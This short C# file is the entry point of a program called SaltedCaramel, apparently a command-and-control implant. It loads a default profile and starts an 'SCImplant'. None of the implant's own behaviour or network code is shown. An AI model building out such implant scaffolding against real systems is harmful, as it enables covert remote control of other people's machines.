using System;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Profiles;

namespace SaltedCaramel
{
    class SaltedCaramel
    {
        static void Main(string[] args)
        {
            DefaultProfile profile = new DefaultProfile();
            SCImplant implant = new SCImplant(profile);
            implant.Start();
        }
    }
}
